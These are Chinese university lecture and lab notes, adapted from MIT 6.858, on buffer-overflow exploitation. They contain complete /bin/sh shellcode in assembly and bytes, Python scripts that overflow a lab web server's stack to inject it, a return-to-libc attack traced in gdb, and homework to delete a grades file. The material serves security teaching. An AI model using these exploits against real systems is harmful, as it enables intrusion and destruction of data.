#缓冲区溢出3：Shellcode与漏洞利用

###哈尔滨工业大学 网络与信息安全 张宇 2016

参考课程: [MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm) 

---

###Shellcode原理

参考资料：[Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html#article)

利用缓冲区溢出漏洞改写函数返回地址来劫持程序控制流，令其指向预执行代码。通常该代码会启动一个shell，称作"shellcode"。下面是一个C语言程序启动shell的例子。

``` c
#include <stdio.h>void main() {   char *name[2];   name[0] = "/bin/sh";   name[1] = NULL;
   /* int execve(const char *filename, char *const argv[],
          char *const envp[]);   */   execve(name[0], name, NULL);
   exit(0);}
```

`execve()`在父进程中fork一个子进程，在子进程中调用`exec()`函数启动新的程序。`exec`系列函数中`execve()`为内核级系统调用。 `execve()`执行第一个参数`filename`字符串所指文件，第二个参数是利用数组指针来传递命令行参数(第一个元素是命令本身)，并且要以空指针`null`结束，最后一个参数则为传递给执行文件的新环境变量数组。Linux的`execve()`通过寄存器传递参数，由0x80软中断触发`syscall()`调用，过程如下：

1. 内存中存在`null`结尾字符串`"/bin/sh"`
1. 内存中存在`"/bin/sh"的地址`后加一个`null long word`1. 拷贝`execve`调用编号(`0xb`)到`eax`1. 拷贝`"/bin/sh"的地址`到`ebx`1. 拷贝`"/bin/sh"的地址的地址`到`ecx`1. 拷贝`null long word的地址`到`edx`1. 执行`int $0x80`调用`syscall()`

若`execve()`调用失败，程序将继续执行，很可能导致崩溃。为在调用失败后仍然可以正常退出，在`execve()`之后添加`exit(0)`：

1. 拷贝`exit`调用号(`0x1`)到`exa`
2. 拷贝`0x0`到`exb`
3. 执行`int $0x80`调用`syscall()`

在shellcode中，多处需要用到地址，一个问题是事先并不知道代码和字符串会被放置在哪里。解决该问题的一种方法是用`jmp`和`call`指令，通过指令指针相对寻址来跳到特定位置，而不需要事先知道准确地址。

首先，在通过改写返回地址来跳转到shellcode后，利用`jmp`指令跳转到`call`指令。将`call`指令放在`"/bin/sh"`字符串之前，当执行`call`指令时，字符串地址将被入栈，作为`call`被执行时的返回地址。`call`指令只需简单的跳转到`jmp`之后的代码，执行`pop`指令将栈中的`call`的返回地址，即字符串地址，拷贝到一个寄存器使用。下面是程序描述与跳转示意图。

1. 返回地址跳转到shellcode（跳转1）
2. `jmp`跳转到`call`（跳转2）
1. `pop`获得`"/bin/sh"地址`
1. 执行`execv()`
1. 执行`exit()`
1. `call`跳转到`pop`（跳转3）
1. 字符串`"/bin/sh"`

```
low address         <———— stack growth ————        high address
                      
          +—————————(3)—————————+
          V                     | 
   [jmp][pop][execve()][exit()][call]["/bin/sh"][sfp][ret][arguments]
   ^  |                          ^                    |
   |  +—————————(2)——————————————+                    |
   +——————————————————————————————————(1)—————————————+  

```

通常shellcode将被作为字符串注入缓冲区中。由于空字节(null)会被认为是字符串结尾，因此需要将其中的空字节去掉。一种主要手段是用`xorl %eax,%eax`指令来令`eax`寄存器为`0`，用`eax`作为参数，从而避免在参数中直接使用`0`。另外，shellcode越小越好。

在实验中提供了3个文件：

- `shellcode.S`：shellcode汇编代码
- `shellcode.bin`：编译后二进制代码
- `run-shellcode`：直接运行`shellcode.bin`

查看完整的shellcode代码`shellcode.S`：

``` gas
#include <sys/syscall.h>                /* 系统调用编号表 */

#define STRING  "/bin/sh"               /* 执行命令字符串 */
#define STRLEN  7                       /* 字符串长度 */
#define ARGV    (STRLEN+1)              /* execve()参数2相对偏移量 */
#define ENVP    (ARGV+4)                /* execve()参数3相对偏移量 */
                                        /* argv末尾元素和envp复用同一地址 */
.globl main                             /* 令符号main对ld和其他程序可见 */
        .type   main, @function         /* 设置符号main的类型为函数 */

 main:
        jmp     calladdr                /* 跳转(2)到call */

 popladdr:
        popl    %esi                    /* 将string地址出栈写入esi */
        movl    %esi,(ARGV)(%esi)       /* 将string地址写入argv */
        xorl    %eax,%eax               /* 获得32位的0 */
        movb    %al,(STRLEN)(%esi)      /* 将string结尾字节置0 */
        movl    %eax,(ENVP)(%esi)       /* 将envp置0 */
                                        /* argv末尾元素和envp复用同一0 */
        movb    $SYS_execve,%al         /* syscall参数1: syscall编号 */
        movl    %esi,%ebx               /* syscall参数2: string地址 */
        leal    ARGV(%esi),%ecx         /* syscall参数3: argv地址 */
        leal    ENVP(%esi),%edx         /* syscall参数4: envp地址 */
        int     $0x80                   /* 调用syscall */

        xorl    %ebx,%ebx               /* syscall参数2: 0 */
        movl    %ebx,%eax               /* 将eax置0 */
        inc     %eax                    /* syscall参数1: SYS_exit (1) */
                                        /* 用mov+inc来避免空字节 */
        int     $0x80                   /* 调用syscall */

 calladdr:
        call    popladdr                /* 将下一指令(string)地址入栈后跳转 */
        .ascii  STRING                  /* 将字符串(不追加0)存入连续地址 */
```

下列命令用于编译，提取，反编译，执行shellcode：

- 编译：`gcc -m32 -c -o shellcode.bin shellcode.S`
- 提取二进制指令：`objcopy -S -O binary -j .text shellcode.bin`
- 反编译：`objdump -D -b binary -mi386 shellcode.bin`
- 执行：`./run-shellcode shellcode.bin`

``` gas
$ objdump -D -b binary -mi386 shellcode.bin

shellcode.bin:     file format binary
Disassembly of section .data:

00000000 <.data>:
   0:   eb 1f                   jmp    0x21
   2:   5e                      pop    %esi
   3:   89 76 08                mov    %esi,0x8(%esi)
   6:   31 c0                   xor    %eax,%eax
   8:   88 46 07                mov    %al,0x7(%esi)
   b:   89 46 0c                mov    %eax,0xc(%esi)
   e:   b0 0b                   mov    $0xb,%al
  10:   89 f3                   mov    %esi,%ebx
  12:   8d 4e 08                lea    0x8(%esi),%ecx
  15:   8d 56 0c                lea    0xc(%esi),%edx
  18:   cd 80                   int    $0x80
  1a:   31 db                   xor    %ebx,%ebx
  1c:   89 d8                   mov    %ebx,%eax
  1e:   40                      inc    %eax
  1f:   cd 80                   int    $0x80
  21:   e8 dc ff ff ff          call   0x2
  26:   2f                      das                       # /bin/sh
  27:   62 69 6e                bound  %ebp,0x6e(%ecx)
  2a:   2f                      das
  2b:   73 68                   jae    0x95
```

运行上述shellcode可以启动一个新shell：

``` sh
$ ./run-shellcode shellcode.bin
$ 
```
---
###代码注入

利用之前的漏洞将shellcode注入到web服务器并启动shell。回顾之前的漏洞触发过程：

(1) 构造"过长的"客户端请求，并发送请求到服务器。

``` python
def build_exploit(shellcode):
	req =   "GET /" + 'A' * 1024 + " HTTP/1.0\r\n" + \
   		     "\r\n"
	return req
```

(2) 服务器端`zookd`处理请求并转发给`zookfs`。处理请求的代码在`http.c`中，其中存在缓冲区溢出漏洞。

``` c
zookd.c:70:    if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))

zookfs.c:47:    http_serve(sockfd, getenv("REQUEST_URI"));

```
`http_serve()`函数中`strcat()`触发缓冲区溢出漏洞导致`handler`变量被改写，在执行`(*handler)()`函数时导致程序崩溃。

``` c
void http_serve(int fd, const char *name)
{
    void (*handler)(int, const char *) = http_serve_none;
    char pn[1024];
    struct stat st;

    getcwd(pn, sizeof(pn));
    setenv("DOCUMENT_ROOT", pn, 1);

    strcat(pn, name);
    split_path(pn);

    /* ...代码有删节... */
    
    handler(fd, pn);
}
```

`http_serve()`的栈结构：

```
+———————————————————————-+   
|          name          |<——— (+12)   =0xbfffde14       
+———————————————————————-+   
|        fd = 3          |<——— (+8)    =0xbfffde10                                  
+———————————————————————-+                                 
|     return address     |<——— (+4)    =0xbfffde0c 
+———————————————————————-+                             
|          ebp           |<——— (0)     =0xbfffde08
+———————————————————————-+
|                        |
+————————————————————————+
|    void (*handler)     |<——— (-12)   =0xbfffddfc
+————————————————————————+
|pn[1023]   ^            |
|           |            |
|           |       pn[0]|<——— (-1036) =0xbfffd9fc
+————————————————————————+
|    struct stat st      | 
|       (88bytes)        |<——— (-1124) =0xbfffd9a4
+———————————————————————-+

```

攻击手段是构造一个请求令`pn`缓冲区溢出，从而改写`handler`指针，令其指向shellcode。

```  
        bottom of the stack                               
+————————————————————+———————————+——————————————————————+
|  void (*handler)   |  ^        | address of shellcode |———+
+————————————————————+  |        +——————————————————————+   |      
|pn[1023]   ^        |  |        |    'AAA'...'AAA'     |   |
|           |        |  |        +——————————————————————+   |
|           |        |  | name[0]|      shellcode       |<——+
|           |        +———————————+——————————————————————+
|           |   pn[0]|   getwd   |  "/home/httpd/lab/"  |
+————————————————————+———————————+——————————————————————+<——0xbfffd9fc

```
以此构造请求需要计算两个值：

- 填充'A'的个数：`1024-len("/home/httpd/lab/")-len(shellcode)`
- shellcode在栈中地址：`0xbfffd9fc + len("/home/httpd/lab/")`

``` python
stack_buffer = 0xbfffd9fc

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    req =   "GET /" + urllib.quote(shellcode) + \
             'A' * (1024-len("/home/httpd/lab/")-len(shellcode)) + \
            struct.pack("<I", stack_buffer + len("/home/httpd/lab/")) + \
            " HTTP/1.0\r\n" + \
            "\r\n"
    return req

```
运行脚本`./exploit-3.py localhost 8080`，并在启动web服务的中断查看shell是否被启动。

---

### Return-to-libc攻击

参考资料：[Bypassing non-executable-stack during exploitation using return-to-libc](http://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf)

大多数操作系统为了防御缓冲区溢出攻击，不允许栈中内容执行，在栈中注入shellcode的方法就失效了。一种可以绕过不可执行栈的方法是**return-to-libc**攻击。该攻击将控制流引向标准库libc中函数，而不需要向栈中注入代码。攻击分为3步：

1. 查找欲利用的在标准库libc中函数的位置，例如`execl`，`system`，或`unlink`
1. 改写返回地址为libc函数地址，在栈中布置函数参数，构造一个libc函数的调用环境
1. 待有漏洞函数返回时，根据返回地址调转到libc函数

启动不可执行栈服务：

```
$ ./clean-env.sh ./zookld zook-nxstack.conf
```

首先，用`gdb`查找libc中函数`system()`地址。

``` sh
$ gdb -q -p $(pgrep zookfs)
(gdb) p system
$1 = {<text variable, no debug info>} 0x40065100 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0x40058150 <__GI_exit>
``` 

得到了`system()`地址为`0x40065100`。但其中最后一个字节的`0x00`导致其不能在字符串中出现。因此，在本漏洞中无法直接使用，而改为调用`exit(16843009)`(`16843009`=`0x01010101`)来做演示，函数地址`0x40058150`。

为了令`http_serve()`正常执行后返回，不能改写`handler`。记录`handler`初始值备用。

``` sh
(gdb) p handler
$2 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
```


[](为了执行`system("/bin/sh")`，还需要一个`"/bin/sh"`字符串。有些情况下，该字符串在环境变量`SHELL`的值中，而环境变量在启动进程时已经被作为参数压入栈底，可用`gdb`在栈中搜索，例如`x/1000s $esp`。本例中未载入该环境变量，需在缓冲区中添加。)



然后，在栈中布置参数为调用做准备。当漏洞函数返回时，根据返回地址跳转到libc函数，libc函数从栈中读取参数。

```  
     stack bottom                           
+———————————————————————————————————————————————————————+ (0x01010101)  
|       name         |<——— (+12) |      argument        | (16843009)
+————————————————————+           +——————————————————————+   
|      fd = 3        |<——— (+8)  |    return address    | (ABCD)
+————————————————————+           +——————————————————————+
|   return address   |<——— (+4)  |    exit() address    | (0x40058150)
+————————————————————+           +——————————————————————+
|        ebp         |<——— (0)   |                      |<——0xbfffde08
+————————————————————+           |                      |
|                    |           |                      |
+————————————————————+           +——————————————————————+
|  void (*handler)   |  ^        |     unchanged        | (0x80495ea)
+————————————————————+  |        +——————————————————————+         
|pn[1023]   ^        |  |        |                      |   
|           |        |  |        |                      |   
|           |        |  | name[0]|                      |
|           |        +———————————+——————————————————————+
|           |   pn[0]|   getwd   |  "/home/httpd/lab/"  |
+———————————————————————————————————————————————————————+<——0xbfffd9fc

```

构造HTTP请求：

``` python
def build_exploit(shellcode):

    handler = 0x80495ea
    exit_addr = 0x40058150
    exit_status = 0x01010101

    req =   "GET /" + \
            'A' * (1024-len("/home/httpd/lab/")) + \
            struct.pack("<I",handler) + \
            'A' * 12 + \
            struct.pack("<I",exit_addr) + \
            "ABCD" + \
            struct.pack("<I",exit_status) + \
            " HTTP/1.0\r\n" + \
            "\r\n"
    return req

```

用`gdb`调试来演示攻击过程与结果：

``` gas
$ gdb -p $(pgrep zookfs)
(gdb) b http_serve
Breakpoint 1 at 0x804951c: file http.c, line 275.
(gdb) c
Continuing.

[发送请求: ./exploit-4sh.py localhost 8080]

[New process 9883]
[Switching to process 9883]

Breakpoint 1, http_serve (fd=3, name=0x80510b4 "/", 'A' <repeats 199 times>...) at http.c:275
warning: Source file is more recent than executable.
275         void (*handler)(int, const char *) = http_serve_none;
(gdb) n
279         getcwd(pn, sizeof(pn));
(gdb)
280         setenv("DOCUMENT_ROOT", pn, 1);
(gdb)
282         strcat(pn, name);
(gdb)
283         split_path(pn);
(gdb) x/10s pn        [查看buffer]
0xbfffd9fc:     "/home/httpd/lab/", 'A' <repeats 184 times>...
0xbfffdac4:     'A' <repeats 200 times>...
0xbfffdb8c:     'A' <repeats 200 times>...
0xbfffdc54:     'A' <repeats 200 times>...
0xbfffdd1c:     'A' <repeats 200 times>...
0xbfffdde4:     'A' <repeats 24 times>, "\352\225\004\b", 'A' <repeats 12 times>, "P\201\005@ABCD\001\001\001\001"
0xbfffde19:     " "
0xbfffde1b:     ""
0xbfffde1c:     ",\376\377\277"
0xbfffde21:     ""
(gdb) p handler       [查看handler是否被改写]
$1 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
(gdb) x/wx $ebp+4     [查看返回地址，已经被改为exit()地址]
0xbfffde0c:     0x40058150
(gdb) x $ebp+12       [查看exit()参数，表明攻击成功]
0xbfffde14:     0x01010101
(gdb) n
285         if (!stat(pn, &st))
(gdb)
296         handler(fd, pn);
(gdb)
297     }
(gdb)                 [继续执行到exit]
__GI_exit (status=16843009) at exit.c:103
103     exit.c: No such file or directory.
(gdb)
104     in exit.c
(gdb)
[Inferior 2 (process 9883) exited with code 01]
```

---

###作业：删除敏感文件

实验资料：[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。

####1. 可执行栈上shellcode攻击

利用缓冲区溢出漏洞将shellcode注入到web服务器，删除一个敏感文件`/home/httpd/grades.txt`。主要任务是构造一个新的shellcode。

**提示：**删除文件系统调用`SYS_unlink`调用号是`10`或`'\n'`(newline)。若`'\n'`直接出现在HTTP请求URL中，则会被截断，因此需要特殊处理。

实验会用到下列命令：

- 创建新文件：`touch /home/httpd/grades.txt`
- 编译：`gcc -m32 -c -o shellcode.bin shellcode.S`
- 提取二进制指令：`objcopy -S -O binary -j .text shellcode.bin`
- 执行二进制指令：`./run-shellcode shellcode.bin`

将攻击程序命名为`exploit-3.py`，用`make check-exstack`来检查攻击是否成功。

####2. 不可执行栈上return-to-libc攻击

在栈不可执行的web服务器上，采用return-to-libc攻击删除敏感文件`/home/httpd/grades.txt`。

将攻击程序命名为`exploit-4a.py`和`exploit-4b.py`，用`make check-libc`来检查攻击是否成功。

**提示：**libc中`unlink()`函数参数是一个指向以`'\0'`结尾字符串的指针。因此，需在栈中注入字符串，并保证在漏洞触发时，该字符串结尾为`'\0'`。



